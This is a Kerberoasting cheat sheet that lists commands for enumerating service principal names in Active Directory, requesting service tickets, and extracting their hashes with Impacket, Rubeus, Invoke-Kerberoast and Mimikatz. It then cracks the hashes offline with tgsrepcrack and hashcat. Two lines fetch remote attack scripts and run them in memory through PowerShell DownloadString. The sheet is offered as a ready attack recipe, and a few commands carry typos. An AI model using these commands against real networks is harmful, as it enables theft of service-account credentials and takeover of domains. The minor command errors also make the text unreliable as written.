KERBEROASTING CHEAT-SHEET

Search cached tickets and available SPN's in system:

PS> klist (get list available cached tickets)

PS> setspn -T TestDomain -Q */* (find available SPN's in current system)


After detecting SPN of some account(For example will be used MSSQL):

PS> Add-Type-AssemblyName System.IdentityModel

PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.domain.local:1433"

PS> klist (for making sure that service ticket was loaded into memory)

--------------------------------------------------------------------------------------------------------------

Also you can use Impacket-GetUserSPN.py (https://github.com/SecureAuthCorp/impacket)
# python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>

or Rubeus(https://github.com/GhostPack/Rubeus)

# .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> (Linux terminal command)

PS> iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

PS> Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

--------------------------------------------------------------------------------------------------------------

Using MIMIKATZ for downloading a service ticket from memory

PS> Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps')  (Command for downloading Invoke-Mimikatz script)

PS> Invoke-Mimikatz -Command '"kerberos::list"' (this command open mimikatz cmd )

mimikatz# kerberos::list

mimikatz# kerberos::list /export (uploading on disk)

--------------------------------------------------------------------------------------------------------------

Ticket cracking:

1 way (using tgsrepcrack.py script from https://github.com/kerberoast repository):

root@kali# python tgsrepcrack.py wordlist.txt 1-40a10000-SomeUser@MSSQLSERVER~SQL-Server.testdomain.com~1433-TESTDOMAIN.COM.kirbi


2 way (using hashcat):

root@kali# hashcat -a 0 -m 13100 tgs.hash /path/to/wordlist.txt
